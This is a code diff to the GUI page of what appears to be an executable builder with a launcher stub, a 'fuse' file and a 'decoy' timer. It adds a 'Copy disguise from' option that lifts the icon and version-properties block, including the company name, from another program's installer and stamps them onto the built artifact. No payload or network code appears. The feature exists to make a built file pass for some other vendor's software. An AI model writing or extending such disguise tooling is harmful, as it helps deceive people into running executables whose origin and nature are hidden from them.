@@ -42,6 +42,7 @@ __all__ = ["ForgePage"]
 _STUB_KEY: Final[str] = "form/stub"
 _ICON_KEY: Final[str] = "form/icon"
 _FUSE_KEY: Final[str] = "form/fuse"
+_DONOR_KEY: Final[str] = "form/donor"
 
 _REPO_ROOT: Final[Path] = Path(__file__).resolve().parents[2]
 _DEFAULT_STUB: Final[Path] = _REPO_ROOT / "tools" / "dist" / "sable-launcher.exe"
@@ -123,9 +124,31 @@ class ForgePage(QWidget):
         stub_hint.setObjectName("hint")
         stub_hint.setWordWrap(True)
 
+        # A donor is read, never run and never unpacked: the same walk the update path
+        # uses on the stub, pointed at a file that already looks the way this build
+        # should look.
+        self._donor = LabelledEdit(
+            "Copy disguise from",
+            placeholder="an installer to look like",
+            browse=True,
+            filters="Programs (*.exe);;All files (*)",
+        )
+        self._donor.set_text(self._remembered(_DONOR_KEY))
+        self._donor.changed.connect(lambda value: self._remember(_DONOR_KEY, value))
+
+        donor_hint = QLabel(
+            "Reads the icon and the properties block out of an executable that already "
+            "looks like something, and writes both onto this artifact in the same "
+            "resource pass. Typed fields win field by field, so a copied company name "
+            "can be corrected without retyping the rest. Nothing is run and nothing is "
+            "unpacked."
+        )
+        donor_hint.setObjectName("hint")
+        donor_hint.setWordWrap(True)
+
         # The icon patches the launcher's resources on the copy being written. Nothing
         # is refrozen: the same launcher still opens every build, and only this artifact
-        # carries this icon.
+        # carries this icon. An explicit .ico wins over the donor's group.
         self._icon = LabelledEdit(
             "Icon",
             placeholder="leave blank for the launcher's own",
@@ -149,6 +172,8 @@ class ForgePage(QWidget):
         )
         launcher_card.add(self._stub)
         launcher_card.body.addWidget(stub_hint)
+        launcher_card.add(self._donor)
+        launcher_card.body.addWidget(donor_hint)
         launcher_card.add(self._icon)
         launcher_card.body.addWidget(icon_hint)
 
@@ -265,6 +290,10 @@ class ForgePage(QWidget):
     def icon(self) -> Path | None:
         return self._icon.path()
 
+    def donor(self) -> Path | None:
+        """The executable to copy the icon and version block from, if any."""
+        return self._donor.path()
+
     def fuse(self) -> Path | None:
         return self._fuse.path()
 
@@ -300,6 +329,7 @@ class ForgePage(QWidget):
             "name": self.name(),
             "stub": self.stub(),
             "icon": self.icon(),
+            "donor": self.donor(),
             "fuse": self.fuse(),
             "version": self.version(),
             "decoy_seconds": seconds,
@@ -313,6 +343,7 @@ class ForgePage(QWidget):
         self._name.clear_problem()
         self._stub.clear_problem()
         self._icon.clear_problem()
+        self._donor.clear_problem()
         self._fuse.clear_problem()
         for field in (
             self._company,
@@ -352,6 +383,8 @@ class ForgePage(QWidget):
                 self._stub.set_problem(problem.message)
             elif problem.path == "output.icon":
                 self._icon.set_problem(problem.message)
+            elif problem.path == "output.donor":
+                self._donor.set_problem(problem.message)
             elif problem.path == "output.fuse":
                 self._fuse.set_problem(problem.message)
             else:
@@ -367,6 +400,7 @@ class ForgePage(QWidget):
         self._note.setText(_NOTES.get(mode, ""))
         self._stub.setEnabled(mode == OUTPUT_EXE)
         self._icon.setEnabled(mode == OUTPUT_EXE)
+        self._donor.setEnabled(mode == OUTPUT_EXE)
         self._refresh_preview()
 
     def _refresh_preview(self, _text: str = "") -> None:
